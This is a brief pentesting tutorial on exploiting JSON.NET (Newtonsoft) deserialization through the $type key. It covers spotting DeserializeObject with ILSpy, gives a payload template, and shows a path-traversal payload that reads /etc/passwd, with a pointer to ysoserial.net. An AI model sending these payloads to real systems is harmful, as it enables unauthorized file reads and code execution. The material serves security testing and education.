# JSON.NET Deserialization

## &#x20;<a href="#jsonnet-deserialization" id="jsonnet-deserialization"></a>

In .NET application that uses JSON.net (Newtonsoft library), we can inject arbitrary code or read local files by abusing JSON deserialization objects.

### Investigation <a href="#investigation" id="investigation"></a>

We can decompile **`.dll`** files using [**ILSpy**](https://github.com/icsharpcode/ILSpy) in Windows. If you like to use ILSpy in Linux, use [**AvaloniaILSpy**](https://github.com/icsharpcode/AvaloniaILSpy).

```shellscript
json = JsonConvert.DeserializeObject<Example>(json);
```

If the application uses **“JsonConvert.DeserializeObject”** function, we can abuse JSON object and execute arbitrary code or read local files.

### Exploitation <a href="#exploitation" id="exploitation"></a>

We can give the Json value to the “JsonConvert.DeserializeObject(json)” with a reserved key (**`$type`**).\
The format is as follow. The value of **`$type`** is a string that contains the assembly-qualified name of the .NET type to be deserialized.

```shellscript
{
    "$type": "<namespace>.<class>, <assembly>",
    "<method_name>": "<attribute>"
}
```

#### LFI <a href="#lfi" id="lfi"></a>

If the application has the method that reads file, we can use this method and read desired files by abusing JSON oject to deserialize. For example, the application has **"ReadFile"** method in the **"File"** class so we can use it to read local files.

```shellscript
{
    "$type": "Example.File, example",
    "ReadFile": "../../../../etc/passwd"
}
```

### Deserialization Payload Generator <a href="#deserialization-payload-generator" id="deserialization-payload-generator"></a>

For .NET, we can use [Ysoserial.net](https://github.com/pwntester/ysoserial.net) but Windows machine required.

### References <a href="#references" id="references"></a>

* [Newtonsoft](https://www.newtonsoft.com/json)
* [OWASP](https://owasp.org/www-chapter-vancouver/assets/presentations/2020-05_Exploiting_and_Preventing_Deserialization_Vulnerabilities.pdf)
* [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
